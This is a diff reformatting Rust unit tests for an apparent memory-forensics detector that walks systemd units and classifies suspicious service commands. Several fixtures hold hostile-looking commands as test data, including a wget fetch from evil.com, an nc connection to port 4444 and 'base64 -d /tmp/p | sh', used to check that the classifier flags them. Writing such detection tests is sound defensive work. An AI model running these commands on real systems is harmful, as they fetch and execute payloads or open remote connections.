@@ -469,7 +469,10 @@ mod tests {
         let reader = ObjectReader::new(vas, Box::new(resolver));
 
         let result = walk_systemd_units(&reader).unwrap_or_default();
-        assert!(result.is_empty(), "systemd with mm==NULL should yield no unit findings");
+        assert!(
+            result.is_empty(),
+            "systemd with mm==NULL should yield no unit findings"
+        );
     }
 
     // ---------------------------------------------------------------------------
@@ -491,7 +494,10 @@ mod tests {
         let reader = ObjectReader::new(vas, Box::new(resolver));
 
         let result = walk_systemd_units(&reader).unwrap();
-        assert!(result.is_empty(), "missing tasks field must yield empty result");
+        assert!(
+            result.is_empty(),
+            "missing tasks field must yield empty result"
+        );
     }
 
     // ---------------------------------------------------------------------------
@@ -605,12 +611,18 @@ mod tests {
 
     #[test]
     fn classify_systemd_unit_networkmanager_not_suspicious() {
-        assert!(!classify_systemd_unit("NetworkManager.service", "/usr/sbin/NetworkManager"));
+        assert!(!classify_systemd_unit(
+            "NetworkManager.service",
+            "/usr/sbin/NetworkManager"
+        ));
     }
 
     #[test]
     fn classify_systemd_unit_dbus_not_suspicious() {
-        assert!(!classify_systemd_unit("dbus.service", "/usr/bin/dbus-daemon"));
+        assert!(!classify_systemd_unit(
+            "dbus.service",
+            "/usr/bin/dbus-daemon"
+        ));
     }
 
     #[test]
@@ -625,22 +637,34 @@ mod tests {
 
     #[test]
     fn classify_systemd_unit_wget_exec_suspicious() {
-        assert!(classify_systemd_unit("updater.service", "wget http://evil.com/payload -O /tmp/p"));
+        assert!(classify_systemd_unit(
+            "updater.service",
+            "wget http://evil.com/payload -O /tmp/p"
+        ));
     }
 
     #[test]
     fn classify_systemd_unit_python_exec_suspicious() {
-        assert!(classify_systemd_unit("runner.service", "python /var/tmp/runner.py"));
+        assert!(classify_systemd_unit(
+            "runner.service",
+            "python /var/tmp/runner.py"
+        ));
     }
 
     #[test]
     fn classify_systemd_unit_perl_exec_suspicious() {
-        assert!(classify_systemd_unit("runner.service", "perl -e 'print\"hi\"'"));
+        assert!(classify_systemd_unit(
+            "runner.service",
+            "perl -e 'print\"hi\"'"
+        ));
     }
 
     #[test]
     fn classify_systemd_unit_nc_exec_suspicious() {
-        assert!(classify_systemd_unit("backdoor.service", "nc 10.0.0.1 4444"));
+        assert!(classify_systemd_unit(
+            "backdoor.service",
+            "nc 10.0.0.1 4444"
+        ));
     }
 
     #[test]
@@ -650,7 +674,10 @@ mod tests {
 
     #[test]
     fn classify_systemd_unit_base64_exec_suspicious() {
-        assert!(classify_systemd_unit("backdoor.service", "base64 -d /tmp/p | sh"));
+        assert!(classify_systemd_unit(
+            "backdoor.service",
+            "base64 -d /tmp/p | sh"
+        ));
     }
 
     #[test]
@@ -683,7 +710,10 @@ mod tests {
 
     #[test]
     fn classify_systemd_unit_lib_not_suspicious() {
-        assert!(!classify_systemd_unit("myapp.service", "/lib/systemd/myapp"));
+        assert!(!classify_systemd_unit(
+            "myapp.service",
+            "/lib/systemd/myapp"
+        ));
     }
 
     // ---------------------------------------------------------------------------
@@ -731,9 +761,9 @@ mod tests {
         let mut vma_page = [0u8; 4096];
         vma_page[0..8].copy_from_slice(&data_vaddr.to_le_bytes()); // vm_start
         let data_end = data_vaddr + 4096u64;
-        vma_page[8..16].copy_from_slice(&data_end.to_le_bytes());  // vm_end
-        vma_page[16..24].copy_from_slice(&0u64.to_le_bytes());     // vm_next = 0
-        // vm_flags: readable (bit 0) = 1, not executable (bit 2) = 0 → 0x1
+        vma_page[8..16].copy_from_slice(&data_end.to_le_bytes()); // vm_end
+        vma_page[16..24].copy_from_slice(&0u64.to_le_bytes()); // vm_next = 0
+                                                               // vm_flags: readable (bit 0) = 1, not executable (bit 2) = 0 → 0x1
         vma_page[24..32].copy_from_slice(&0x1u64.to_le_bytes());
 
         // Data page: put "evil.service\0" near the start
@@ -743,10 +773,10 @@ mod tests {
 
         let isf = IsfBuilder::new()
             .add_struct("task_struct", 128)
-            .add_field("task_struct", "pid",   0x00u64, "unsigned int")
-            .add_field("task_struct", "tasks", 16u64,   "list_head")
-            .add_field("task_struct", "comm",  32u64,   "char")
-            .add_field("task_struct", "mm",    48u64,   "pointer")
+            .add_field("task_struct", "pid", 0x00u64, "unsigned int")
+            .add_field("task_struct", "tasks", 16u64, "list_head")
+            .add_field("task_struct", "comm", 32u64, "char")
+            .add_field("task_struct", "mm", 48u64, "pointer")
             .add_struct("list_head", 16)
             .add_field("list_head", "next", 0x00u64, "pointer")
             .add_field("list_head", "prev", 0x08u64, "pointer")
@@ -754,8 +784,8 @@ mod tests {
             .add_field("mm_struct", "mmap", 8u64, "pointer")
             .add_struct("vm_area_struct", 64)
             .add_field("vm_area_struct", "vm_start", 0x00u64, "unsigned long")
-            .add_field("vm_area_struct", "vm_end",   0x08u64, "unsigned long")
-            .add_field("vm_area_struct", "vm_next",  0x10u64, "pointer")
+            .add_field("vm_area_struct", "vm_end", 0x08u64, "unsigned long")
+            .add_field("vm_area_struct", "vm_next", 0x10u64, "pointer")
             .add_field("vm_area_struct", "vm_flags", 0x18u64, "unsigned long")
             .add_symbol("init_task", task_vaddr)
             .build_json();
@@ -826,10 +856,10 @@ mod tests {
 
         let isf = IsfBuilder::new()
             .add_struct("task_struct", 128)
-            .add_field("task_struct", "pid",   0x00u64, "unsigned int")
-            .add_field("task_struct", "tasks", 16u64,   "list_head")
-            .add_field("task_struct", "comm",  32u64,   "char")
-            .add_field("task_struct", "mm",    48u64,   "pointer")
+            .add_field("task_struct", "pid", 0x00u64, "unsigned int")
+            .add_field("task_struct", "tasks", 16u64, "list_head")
+            .add_field("task_struct", "comm", 32u64, "char")
+            .add_field("task_struct", "mm", 48u64, "pointer")
             .add_struct("list_head", 16)
             .add_field("list_head", "next", 0x00u64, "pointer")
             .add_field("list_head", "prev", 0x08u64, "pointer")
@@ -837,8 +867,8 @@ mod tests {
             .add_field("mm_struct", "mmap", 8u64, "pointer")
             .add_struct("vm_area_struct", 64)
             .add_field("vm_area_struct", "vm_start", 0x00u64, "unsigned long")
-            .add_field("vm_area_struct", "vm_end",   0x08u64, "unsigned long")
-            .add_field("vm_area_struct", "vm_next",  0x10u64, "pointer")
+            .add_field("vm_area_struct", "vm_end", 0x08u64, "unsigned long")
+            .add_field("vm_area_struct", "vm_next", 0x10u64, "pointer")
             .add_field("vm_area_struct", "vm_flags", 0x18u64, "unsigned long")
             .add_symbol("init_task", task_vaddr)
             .build_json();
